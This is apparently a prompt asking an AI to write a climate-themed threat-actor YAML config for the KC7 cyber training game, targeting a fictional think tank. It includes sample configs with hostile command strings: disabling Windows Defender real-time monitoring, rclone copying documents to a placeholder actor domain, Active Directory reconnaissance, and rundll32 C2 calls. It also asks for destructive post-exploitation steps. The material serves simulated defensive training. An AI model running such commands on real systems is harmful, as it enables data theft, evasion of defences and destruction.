@@ -1,0 +1,211 @@
+
+The following game config is used to generate a spy themed cyber threat actor as part of the KC7 cyber game. 
+Can you generate a similar one for a "climate change" themed actor that targets a think tank named Innovation Nexus? 
+More information about the thank tank in provided in the yaml config below
+Use 3-4 attacks. 
+The post-exploitation commands should lead to a destructive attack.
+ Give me the output in yaml
+
+name : AirForceOne
+effectiveness: 80
+count_init_passive_dns: 10
+max_wave_size: 3
+attacks:
+  - recon:browsing
+  - watering_hole:malware_delivery
+watering_hole_domains:
+  - blimpgoespop.com
+watering_hole_target_roles:
+  - Balloon Operations Analyst
+  - Balloon Pilot
+domain_themes:
+  - mission
+  - infiltrate
+  - intel
+  - surveil
+  - covert
+  - espionage
+  - undercover
+  - interrogate
+  - crypto
+  - deception
+  - sabotage
+  - extraction
+  - cipher
+  - bug
+sender_themes: 
+  - agent
+  - spy
+  - operative
+  - infiltrator
+  - asset
+  - handler
+  - double-agent
+  - mole
+  - undercover
+  - covert
+  - saboteur
+subjects:
+  - "Inquiry about hot air balloon rental for a private event"
+  - "Request for hot air balloon ride for a VIP client"
+  - "Invitation to showcase hot air balloon technology at a science and technology conference"
+  - "Inquiry About Balloon Flight Availability"
+  - "Quote Request for Balloon Flight Services"
+  - "Flight Booking Confirmation"
+  - "Request for Balloon Flight Itinerary"
+  - "Request for Balloon Flight Safety Records"
+  - "Request for Balloon Flight Insurance Information"
+  - "Request for Balloon Pilot Background Check Information"
+  - "Request for Balloon Service Provider's License and Credentials"
+recon_search_terms:
+  - balloon plot for world domination
+  - spy balloon blueprints
+  - weapons enabled balloons
+  - what OS do the balloons run?
+  - balloon blue screen of death
+  - project sky-high
+  - balloon administrtor passwordss
+file_names:
+  - Hot-Air-Balloon-Fleet-Overview.docx
+  - Routes-and-Destinations.docx
+  - Flight-Procedures-and-Safety-Information.docx
+  - Equipment-and-Supplies.docx
+  - Flight-Crew-Information.docx
+  - Balloon-Feedback-and-Surveys.docx
+  - Balloon-Maintenance-and-Repair-Logs.docx
+  - Balloon-Flight-Sales-and-Marketing-Reports.docx
+  - Balloon-Flight-Budget-and-Financial-Statements.docx
+  - Marketing-Materials-and-Brochures.docx
+tlds:
+  - com
+  - air
+spoofs_email: False
+malware:
+  - hindenburg
+post_exploit_commands:
+  - name: cmd.exe
+    process: cmd.exe dirr
+  - name: cmd.exe
+    process: cmd.exe dir
+  - name: cmd.exe
+    process: "cmd.exe dir C:\\"
+  - name: cmd.exe
+    process: "cmd.exe dir E:\\"
+  - name: cmd.exe
+    process: "cmd.exe cd Documents"
+  - name: cmd.exe
+    process: "cmd.exe powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"
+  - name: rclone.exe 
+    process: 'rclone.exe copy --transfers12 "*docx" "*xls" "*pdf" "*zip" {actor_domain}'
+
+here is some additional context about the type of attacks that can be used. 
+
+
+# all configs require definition of domains, senders, 
+# avoid using both email:phishing and email:malware_delivery on the same actor
+# the partners are already define on the Company config
+attacks:
+  - recon:browsing
+  # actor conducts reconnaissance  - as observed in the inbound browsing logs
+  # requirements:
+  # - recon_search_terms
+  - watering_hole:phishing
+  # actor conducts a wateringhole attack by staging a malicious payload on partner domain
+  # attack is visible via victim clicks in the outbound browsing logs
+  # victims have their credentials stolen by the attacker
+  # requirements:
+  # - domain_themes
+  # - partners must be defined on the actor company.yaml file
+  - watering_hole:malware_delivery
+  # actor conducts a wateringhole attack by staging a malicious payload on partner domain
+  # attack is visible via victim clicks in the outbound browsing logs
+  # victims download malware as a result of clicking the links
+  # requirements:
+  # - malware
+  # - domain_themes
+  # - file_names
+  # - post_exploit_commands (optional)
+  # - partners must be defined on the actor company.yaml file
+  - email:phishing
+  # actor sends credential phishing emails to targets
+  # victims have their credentials stolen by the attacker
+  # requirements:
+  # - subjects
+  # - sender_themes
+  # - domain_themes
+  - email:malware_delivery
+  # actors sends malware via links in email
+  # victims download malware as a result of clicking the links
+  # requirements
+  # - file_names
+  # - malware
+  # - sender_themes
+  # - domain_themes
+  # - post_exploit_commands (optional)
+  - delivery:supply_chain
+  # actor uses partner domains to deliver malicious payloads via email
+  # must be used in conjunction with email:malware_delivery
+  - identity:password_spray
+  # actor conducts a password spray as observed in the authenticaiton logs
+  # requirements: None
+
+
+
+Here is an example malware config
+
+name: hindenburg
+filenames:
+  - blimp.exe
+  - helium.exe
+  - yeargood.exe
+paths:
+  - C:\ProgramData\NotASpy\
+  - C:\Windows\system32\
+recon_processes:
+  - name: cmd.exe
+    process: cmd.exe net group domain admins /domain
+  - name: cmd.exe
+    process: "cmd.exe nltest /dc:list"
+  - name: cmd.exe
+    process: "cmd.exe net localgroup administrators /domain"
+  - name: cmd.exe
+    process: "cmd.exe whoami"
+c2_processes:
+  - name: rundll32.exe
+    process: "rundll32.exe {ip_address}:443"
+
+
+Here is information about the company
+
+name: Innovation Nexus
+domain: innovationnexus.org
+count_employees: 850
+roles:
+  - title: Chief Executive Officer
+    limit: 1
+  - title: Chief Financial Officer
+    limit: 1
+  - title: Chief Research Officer
+    limit: 1
+  - title: Chief Innovation Officer
+    limit: 1
+  - title: Vice President of Research
+    limit: 10
+  - title: Vice President of Innovation
+    limit: 10
+  - title: Research Associate
+    limit: 500
+  - title: Innovation Associate
+    limit: 500
+  - title: Data Analyst
+    limit: 100
+  - title: Project Manager
+    limit: 50
+  - title: Communications Manager
+    limit: 25
+partners:
+  - thinktanknetwork.com
+  - innovatorsforum.org
+  - ideaexchange.net
+  - researchalliance.com
+
